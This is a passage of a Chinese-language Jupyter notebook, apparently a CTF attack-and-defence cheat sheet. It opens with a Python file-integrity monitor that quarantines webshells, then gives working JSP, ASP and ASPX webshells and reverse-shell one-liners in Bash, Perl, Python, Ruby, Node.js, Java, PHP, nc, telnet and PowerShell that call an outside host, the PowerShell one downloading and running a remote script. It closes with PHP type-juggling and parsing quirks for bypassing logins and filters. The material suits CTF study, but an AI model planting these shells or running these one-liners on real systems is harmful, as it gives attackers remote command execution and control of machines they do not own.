    "\n",
    "# 文件路径字典\n",
    "spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))\n",
    "Special_path = {\n",
    "    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),\n",
    "    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),\n",
    "    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),\n",
    "    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),\n",
    "}\n",
    "\n",
    "def isListLike(value):\n",
    "    return isinstance(value, (list, tuple, set))\n",
    "\n",
    "# 获取Unicode编码\n",
    "def getUnicode(value, encoding=None, noneToNull=False):\n",
    "    if noneToNull and value is None:\n",
    "        return NULL\n",
    "    if isListLike(value):\n",
    "        value = list(getUnicode(_, encoding, noneToNull) for _ in value)\n",
    "        return value\n",
    "    if isinstance(value, str):\n",
    "        return value\n",
    "    elif isinstance(value, bytes):\n",
    "        while True:\n",
    "            try:\n",
    "                return str(value)\n",
    "            except UnicodeDecodeError as ex:\n",
    "                try:\n",
    "                    return str(value)\n",
    "                except:\n",
    "                    value = value[:ex.start] + \"\".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]\n",
    "    else:\n",
    "        return str(value)\n",
    "\n",
    "# 目录创建\n",
    "def mkdir_p(path):\n",
    "    import errno\n",
    "    try:\n",
    "        os.makedirs(path)\n",
    "    except OSError as exc:\n",
    "        if exc.errno == errno.EEXIST and os.path.isdir(path):\n",
    "            pass\n",
    "        else: raise\n",
    "\n",
    "# 获取当前所有文件路径\n",
    "def getfilelist(cwd):\n",
    "    filelist = []\n",
    "    for root,subdirs, files in os.walk(cwd):\n",
    "        for filepath in files:\n",
    "            originalfile = os.path.join(root, filepath)\n",
    "            if Special_path_str not in originalfile:\n",
    "                filelist.append(originalfile)\n",
    "    return filelist\n",
    "\n",
    "# 计算机文件MD5值\n",
    "def calcMD5(filepath):\n",
    "    try:\n",
    "        with open(filepath,'rb') as f:\n",
    "            md5obj = hashlib.md5()\n",
    "            md5obj.update(f.read())\n",
    "            hash = md5obj.hexdigest()\n",
    "            return hash\n",
    "    except Exception as e:\n",
    "        pass\n",
    "        # try:\n",
    "            # ORIGIN_FILE_LIST.remove(filepath)\n",
    "            # FILE_MD5_DICT.pop(filepath, None)\n",
    "        # except KeyError as e:\n",
    "            # pass\n",
    "\n",
    "# 获取所有文件MD5\n",
    "def getfilemd5dict(filelist = []):\n",
    "    filemd5dict = {}\n",
    "    for ori_file in filelist:\n",
    "        if Special_path_str not in ori_file:\n",
    "            md5 = calcMD5(os.path.realpath(ori_file))\n",
    "            if md5:\n",
    "                filemd5dict[ori_file] = md5\n",
    "    return filemd5dict\n",
    "\n",
    "# 备份所有文件\n",
    "def backup_file(filelist=[],filedict={}):\n",
    "    # if len(os.listdir(Special_path['bak'])) == 0:\n",
    "    for filepath in filelist:\n",
    "        if Special_path_str not in filepath:\n",
    "            mkdir_p(os.path.join(Special_path['bak'],filedict[filepath][0:2]))\n",
    "            shutil.copy2(filepath, os.path.join(Special_path['bak'],filedict[filepath][0:2])+\"\\\\\"+filedict[filepath]+\"_\"+ntpath.basename(filepath))\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    print (u'---------start------------')\n",
    "    for value in Special_path:\n",
    "        mkdir_p(Special_path[value])\n",
    "    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件\n",
    "    ORIGIN_FILE_LIST = getfilelist(CWD)\n",
    "    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)\n",
    "    backup_file(ORIGIN_FILE_LIST,FILE_MD5_DICT) # TODO 备份文件可能会产生重名BUG\n",
    "    print (u'[*] pre work end!')\n",
    "    while True:\n",
    "        file_list = getfilelist(CWD)\n",
    "        # 移除新上传文件\n",
    "        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))\n",
    "        if len(set(file_list)) > len(set(ORIGIN_FILE_LIST)) and len(diff_file_list) != 0:\n",
    "            # import pdb;pdb.set_trace()\n",
    "            for filepath in diff_file_list:\n",
    "                try:\n",
    "                    f = open(filepath, 'rb').read()\n",
    "                except Exception as e:\n",
    "                    break\n",
    "                if bytes(Special_string,'utf-8') not in f:\n",
    "                    try:\n",
    "                        print (u'[*] webshell find, will be deleted! : ' + getUnicode(filepath))\n",
    "                        md5=calcMD5(filepath)\n",
    "                        mkdir_p(os.path.join(Special_path['webshell'],md5[0:2]))\n",
    "                        shutil.move(filepath, os.path.join(Special_path['webshell'],md5[0:2])+\"\\\\\"+md5+\"_\"+ntpath.basename(filepath) + '.txt')\n",
    "                    except Exception as e:\n",
    "                        print (u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath))\n",
    "                    try:\n",
    "                        f = open(os.path.join(Special_path['log'], time.strftime(\"%Y-%m-%d\",time.localtime(time.time()))+'_log.txt'), 'a')\n",
    "                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\\n')\n",
    "                        f.close()\n",
    "                    except Exception as e:\n",
    "                        print (u'[-] log error : file move error: ' + getUnicode(e))\n",
    "                    \n",
    "        # 防止任意文件被修改删除,还原被修改删除文件\n",
    "        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)\n",
    "        for filekey in FILE_MD5_DICT:\n",
    "            if filekey in md5_dict:\n",
    "                if md5_dict[filekey] != FILE_MD5_DICT[filekey]:\n",
    "                    try:\n",
    "                        f = open(filekey, 'rb').read()\n",
    "                    except Exception as e:\n",
    "                        break\n",
    "                    if bytes(Special_string,'utf-8') not in f:\n",
    "                        try:\n",
    "                            print (u'[*] file has been changed, will be recovered! : ' + getUnicode(filekey))\n",
    "                            md5=calcMD5(filekey)\n",
    "                            mkdir_p(os.path.join(Special_path['difffile'],md5[0:2]))\n",
    "                            shutil.move(filekey, os.path.join(Special_path['difffile'],md5[0:2])+\"\\\\\"+md5+\"_\"+ntpath.basename(filekey) + '.txt')\n",
    "                            shutil.copy2(os.path.join(Special_path['bak'],FILE_MD5_DICT[filekey][0:2])+\"\\\\\"+FILE_MD5_DICT[filekey]+\"_\"+ntpath.basename(filekey), filekey)\n",
    "                        except Exception as e:\n",
    "                            print (u'[!!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filekey))\n",
    "                        try:\n",
    "                            f = open(os.path.join(Special_path['log'], time.strftime(\"%Y-%m-%d\",time.localtime(time.time()))+'_log.txt'), 'a')\n",
    "                            f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n')\n",
    "                            f.close()\n",
    "                        except Exception as e:\n",
    "                            print (u'[-] log error : done_diff: ' + getUnicode(filekey))\n",
    "                            pass\n",
    "            else:\n",
    "                print (u'[*] file has been deleted, will be recovered! : ' + getUnicode(filekey))\n",
    "                shutil.copy2(os.path.join(Special_path['bak'],FILE_MD5_DICT[filekey][0:2])+\"\\\\\"+FILE_MD5_DICT[filekey]+\"_\"+ntpath.basename(filekey), filekey)\n",
    "                try:\n",
    "                    f = open(os.path.join(Special_path['log'], time.strftime(\"%Y-%m-%d\",time.localtime(time.time()))+'_log.txt'), 'a')\n",
    "                    f.write('recover_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n')\n",
    "                    f.close()\n",
    "                except Exception as e:\n",
    "                    print (u'[-] log error : done_recover: ' + getUnicode(filekey))\n",
    "                    pass\n",
    "                \n",
    "        time.sleep(1)\n",
    "        # print '[*] ' + getUnicode(time.ctime())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 修改 curl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "获取 flag 一般都是通过执行 curl http://xxx.com/flag.txt\n",
    "更改其别名，使其无法获取 flag 内容：\n",
    "\n",
    "alias curl = 'echo flag{e4248e83e4ca862303053f2908a7020d}' 使用别名，\n",
    "chmod -x curl  降权，取消执行权限"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 克制不死马、内存马"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "使用条件竞争的方式，不断循环创建和不死马同名的文件和文件夹，在此次比赛中使用此方式克制\n",
    "了不死马。\n",
    "\n",
    "#!/bin/bash\n",
    "dire=\"/var/www/html/.base.php/\"\n",
    "file=\"/var/www/html/.base.php\"\n",
    "rm -rf $file\n",
    "mkdir $dire\n",
    "./xx.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## JSP Webshell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 無回顯:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 有回顯:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<%\n",
    "if(\"kaibro\".equals(request.getParameter(\"pwd\"))) {\n",
    "    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();\n",
    "    int a = -1;\n",
    "    byte[] b = new byte[2048];\n",
    "    out.print(\"<pre>\");\n",
    "    while((a=in.read(b))!=-1){\n",
    "        out.println(new String(b));\n",
    "    }\n",
    "    out.print(\"</pre>\");\n",
    "}\n",
    "%>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ASP Webshell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<%eval request(\"kaibro\")%>\n",
    "\n",
    "<%execute request(\"kaibro\")%>\n",
    "\n",
    "<%ExecuteGlobal request(\"kaibro\")%>\n",
    "\n",
    "<%response.write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.Readall()%>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ASPX Webshell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 一般:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"kaibro\"],\"unsafe\");%>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 上傳:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<%if (Request.Files.Count!=0){Request.Files[0].SaveAs(Server.MapPath(Request[\"f\"]));}%>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reverse Shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 本機Listen Port"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ncat -vl 5566"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Perl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "perl -e 'use Socket;$i=\"kaibro.tw\";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "bash -i >& /dev/tcp/kaibro.tw/5566 0>&1\n",
    "bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'\n",
    "0<&196;exec 196<>/dev/tcp/kaibro.tw/5566; sh <&196 >&196 2>&196\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### PHP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "php -r '$sock=fsockopen(\"kaibro.tw\",5566);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### NC"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "nc -e /bin/sh kaibro.tw 5566\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Telnet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mknod backpipe p && telnet kaibro.tw 5566 0<backpipe | /bin/bash 1>backpipe\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Python"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"kaibro.tw\",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ruby"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"kaibro.tw\",\"5566\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Node.js"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/bash\"); var client = new net.Socket(); client.connect(5566, \"kaibro.tw\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});\n",
    "require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'\");\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Java"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/kaibro.tw/5278;cat <&5 | while read line; do $line 2>&5 >&5; done\"});p.waitFor();\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Powershell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PHP Tag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<? ?>\n",
    "short_open_tag 決定是否可使用短標記\n",
    "或是編譯php時 --enable-short-tags\n",
    "\n",
    "<?=\n",
    "等價 <? echo\n",
    "自PHP 5.4.0起，always work!\n",
    "\n",
    "<% %>、<%=\n",
    "自PHP 7.0.0起，被移除\n",
    "須將asp_tags設成On\n",
    "\n",
    "<script language=\"php\"\n",
    "自PHP 7.0.0起，被移除\n",
    "<script language=\"php\">system(\"id\"); </script>\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PHP Weak Type"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "var_dump('0xABCdef' == ' 0xABCdef');\n",
    "\n",
    "true (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)\n",
    "\n",
    "\n",
    "\n",
    "var_dump('0010e2' == '1e3’);\n",
    "\n",
    "true\n",
    "         \n",
    "\n",
    "         \n",
    "strcmp([],[])\n",
    "\n",
    "0\n",
    "         \n",
    "         \n",
    "         \n",
    "sha1([])\n",
    "\n",
    "NULL\n",
    "         \n",
    "\n",
    "\n",
    "         \n",
    "'123' == 123\n",
    "         \n",
    "\n",
    "'abc' == 0\n",
    "\n",
    "         \n",
    "'123a' == 123\n",
    "\n",
    "         \n",
    "         \n",
    "         \n",
    "'0x01' == 1\n",
    "\n",
    "PHP 7.0後，16進位字串不再當成數字\n",
    "e.g var_dump('0x01' == 1) => false\n",
    "         \n",
    "         \n",
    "\n",
    "'' == 0 == false == NULL\n",
    "\n",
    "\n",
    "\n",
    "         \n",
    "md5([1,2,3]) == md5([4,5,6]) == NULL\n",
    "\n",
    "可用在登入繞過 (用戶不存在，則password為NULL)\n",
    "         \n",
    "\n",
    "         \n",
    "var_dump(md5(240610708));\n",
    "\n",
    "0e462097431906509019562988736854\n",
    "         \n",
    "\n",
    "\n",
    "var_dump(sha1(10932435112));\n",
    "\n",
    "0e07766915004133176347055865026311692244\n",
    "         \n",
    "         \n",
    "         \n",
    "$a=\"123\"; $b=\"456\"\n",
    "\n",
    "$a + $b == \"579\";\n",
    "$a . $b == \"123456\"\n",
    "         \n",
    "\n",
    "         \n",
    "$a = 0; $b = 'x';\n",
    "\n",
    "$a == false => true\n",
    "$a == $b => true\n",
    "$b == true => true\n",
    "         \n",
    "\n",
    "         \n",
    "$a = 'a'\n",
    "\n",
    "++$a => 'b'\n",
    "$a+1 => 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PHP 其他特性"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "32位元\n",
    "intval('1000000000000') => 2147483647\n",
    "\n",
    "64位元\n",
    "intval('100000000000000000000') => 9223372036854775807\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 浮點數精度"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "php -r \"var_dump(1.000000000000001 == 1);\"\n",
    "\n",
    "false\n",
    "\n",
    "\n",
    "\n",
    "php -r \"var_dump(1.0000000000000001 == 1);\"\n",
    "\n",
    "true\n",
    "\n",
    "\n",
    "\n",
    "$a = 0.1 * 0.1; var_dump($a == 0.01);\n",
    "\n",
    "false\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ereg會被NULL截斷"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "var_dump(ereg(\"^[a-zA-Z0-9]+$\", \"1234\\x00-!@#%\"));\n",
    "1\n",
    "\n",
    "ereg和eregi在PHP 7.0.0.已經被移除"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### intval"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "四捨五入\n",
    "var_dump(intval('5278.8787'));\n",
    "5278\n",
    "\n",
    "intval(012) => 10\n",
    "intval(\"012\") => 12"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### extract變數覆蓋"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "extract($_GET);\n",
    "\n",
    ".php?_SESSION[name]=admin\n",
    "echo $_SESSION['name'] => 'admin'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### trim"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "會把字串前後的空白(或其他字元)去掉\n",
    "未指定第二參數，預設會去掉以下字元\n",
    "\" \" (0x20)\n",
    "\"\\t\" (0x09)\n",
    "\"\\n\" (0x0A)\n",
    "\"\\x0B\" (0x0B)\n",
    "\"\\r\" (0x0D)\n",
    "\"\\0\" (0x00)\n",
    "\n",
    "可以發現預設不包含\"\\f\" (0x0C)\n",
    "比較：is_numeric()允許\\f在開頭\n",
    "\n",
    "如果參數是unset或空的變數，回傳值是空字串"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### is_numeric"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "is_numeric(\" \\t\\r\\n 123\") => true\n",
    "\n",
    "is_numeric(' 87') => true\n",
    "\n",
    "is_numeric('87 ') => false\n",
    "\n",
    "is_numeric(' 87 ') => false\n",
    "\n",
    "is_numeric('0xdeadbeef')\n",
    "\n",
    "PHP >= 7.0.0 => false\n",
    "PHP < 7.0.0 => true\n",
    "可以拿來繞過注入\n",
    "以下亦為合法(返回True)字串:\n",
    "\n",
    "' -.0'\n",
    "'0.'\n",
    "' +2.1e5'\n",
    "' -1.5E+25'\n",
    "'1.e5'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### in_array"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "in_array('5 or 1=1', array(1, 2, 3, 4, 5))\n",
    "true\n",
    "\n",
    "in_array('kaibro', array(0, 1, 2))\n",
    "true\n",
    "\n",
    "in_array(array(), array('kai'=>false))\n",
    "true\n",
    "\n",
    "in_array(array(), array('kai'=>null))\n",
    "true\n",
    "\n",
    "in_array(array(), array('kai'=>0))\n",
    "false\n",
    "\n",
    "in_array(array(), array('kai'=>'bro'))\n",
    "false\n",
    "\n",
    "in_array('kai', array('kai'=>true))\n",
    "true\n",
    "\n",
    "in_array('kai', array('kai'=>'bro'))\n",
    "false\n",
    "\n",
    "in_array('kai', array('kai'=>0))\n",
    "true\n",
    "\n",
    "in_array('kai', array('kai'=>1))\n",
    "false"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### array_search"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])\n",
    "在haystack陣列中，搜尋needle的值，成功則返回index，失敗返回False\n",
    "\n",
    "$strict為false時，採用不嚴格比較\n",
    "預設是False\n",
    "\n",
    "Example\n",
    "$arr=array(1,2,0); var_dump(array_search('kai', $arr))\n",
    "int(2)\n",
    "$arr=array(1,2,0); var_dump(array_search('1', $arr))\n",
    "int(0)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### parse_str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "parse_str(string, array)\n",
    "\n",
    "會把查詢字串解析到變數中\n",
    "\n",
    "如果未設置第二個參數，會解析到同名變數中\n",
    "\n",
    "PHP7.2中不設置第二個參數會產生E_DEPRECATED警告\n",
    "parse_str('gg[kaibro]=5566');\n",
    "\n",
    "array(1) {\n",
    "  [\"kaibro\"]=>\n",
    "    string(4) \"5566\"\n",
    "}\n",
    "\n",
    "PHP變數有空格和.，會被轉成底線\n",
    "\n",
    "parse_str(\"na.me=kaibro&pass wd=ggininder\",$test);\n",
    "var_dump($test);\n",
    "\n",
    "array(2) { \n",
    "    [\"na_me\"]=> string(6) \"kaibro\" \n",
    "    [\"pass_wd\"]=> string(9) \"ggininder\" \n",
    "} "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### parse_url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "在處理傳入的URL會有問題\n",
    "\n",
    "parse_url('/a.php?id=1')\n",
    "\n",
    "array(2) {\n",
    "  [\"host\"]=>\n",
    "    string(5) \"a.php\"\n",
    "  [\"query\"]=>\n",
    "    string(4) \"id=1\"\n",
    "}\n",
    "\n",
    "\n",
    "parse_url('//a/b')\n",
    "\n",
    "host: a\n",
    "    \n",
    "\n",
    "parse_url('..//a/b/c:80')\n",
    "\n",
    "host: ..\n",
    "port: 80\n",
    "path: //a/b/c:80\n",
    "\n",
    "\n",
    "parse_url('///a.php?id=1')\n",
    "\n",
    "false\n",
    "\n",
    "\n",
    "parse_url('/a.php?id=1:80')\n",
    "\n",
    "PHP < 7.0.0\n",
    "false\n",
    "PHP >= 7.0.0\n",
    "  array(2) { \n",
    "      [\"path\"]=> string(6) \"/a.php\" \n",
    "      [\"query\"]=> string(7) \"id=1:80\" \n",
    "  }\n",
    "    \n",
    "    \n",
    "\n",
    "parse_url('http://kaibro.tw:87878')\n",
    "\n",
    "5.3.X版本以下\n",
    "array(3) { \n",
    "    [\"scheme\"]=> string(4) \"http\" \n",
    "    [\"host\"]=> string(9) \"kaibro.tw\" \n",
    "    [\"port\"]=> int(22342) \n",
    "}\n",
    "\n",
    "其他： false"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### preg_replace"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )\n",
    "搜尋$subject中匹配的$pattern，並用$replacement替換\n",
    "\n",
    "\n",
    "第一個參數用/e修飾符，$replacement會被當成PHP code執行\n",
    "必須有匹配到才會執行\n",
    "PHP 5.5.0起，會產生E_DEPRECATED錯誤\n",
    "PHP 7.0.0不再支援，用preg_replace_callback()代替\n",
    "\n",
    "\n",
    "example:\n",
    "\n",
    "<?php\n",
    "$a='phpkaibro';\n",
    "echo preg_replace('/(.*)kaibro/e','\\\\1info()',$a);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### sprintf / vprintf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "對格式化字串的類型沒檢查\n",
    "格式化字串中%後面的字元(除了%之外)會被當成字串類型吃掉\n",
    "例如%\\、%'、%1$\\'\n",
    "在某些SQLi過濾狀況下，%' and 1=1#中的單引號會被轉義成\\'，%\\又會被吃掉，'成功逃逸\n",
    "原理：sprintf實作是用switch...case...\n",
    "碰到未知類型，default不處理"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### file_put_contents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "第二個參數如果是陣列，PHP會把它串接成字串\n",
    "example:\n",
    "<?php\n",
    "$test = $_GET['txt'];\n",
    "if(preg_match('[<>?]', $test)) die('bye');\n",
    "file_put_contents('output', $test);\n",
    "可以直接?txt[]=<?php phpinfo(); ?>寫入"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### spl_autoload_register"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "spl_autoload_register()可以自動載入Class\n",
    "不指定參數，會自動載入.inc和.php\n",
    "\n",
    "Example:\n",
    "如果目錄下有kaibro.inc，且內容為class Kaibro{...}\n",
    "則spl_autoload_register()會把這個Class載入進來"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 路徑正規化"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "a.php/.\n",
    "file_put_contents(\"a.php/.\", \"<?php phpinfo() ?>\");\n",
    "可成功寫入\n",
    "經測試Windows可以覆寫、Linux無法\n",
    "可以繞過一些正規表達式判斷\n",
    "file_get_contents(\"a.php/.\");\n",
    "經測試Windows下可成功讀、Linux無法\n",
    "還有很多其他function也適用\n",
    "\n",
    "\n",
    "\" => .\n",
    "a\"php\n",
    "\n",
    "\n",
    "> => ?\n",
    "a.p>p\n",
    "a.>>>\n",
    "\n",
    "\n",
    "< => *\n",
    "a.<"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### URL query decode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "$_GET會對傳入的參數做URLdecode再返回\n",
    "$_SERVER['REQUEST_URI']和$_SERVER['QUERY_STRING']則是直接返回\n",
    "Example:\n",
    "\n",
    "Request: http://kaibro.tw/test.php?url=%67%67\n",
    "\n",
    "$_GET: [url] => gg\n",
    "\n",
    "$_SERVER['REQUEST_URI']: /test.php?url=%67%67\n",
    "\n",
    "$_SERVER['QUERY_STRING']: url=%67%67\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### OPcache"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "透過將PHP腳本編譯成Byte code的方式做Cache來提升性能\n",
    "\n",
    "相關設定在php.ini中\n",
    "\n",
    "opcache.enable 是否啟用\n",
    "opcache.file_cache 設定cache目錄\n",
    "例如:opcache.file_cache=\"/tmp/opcache\"\n",
    "/var/www/index.php的暫存會放在/tmp/opcache/[system_id]/var/www/index.php.bin\n",
    "opcache.file_cache_only 設定cache文件優先級\n",
    "opcache.validate_timestamps 是否啟用timestamp驗證\n",
    "system_id是透過Zend和PHP版本號計算出來的，可以確保相容性\n",
    "\n",
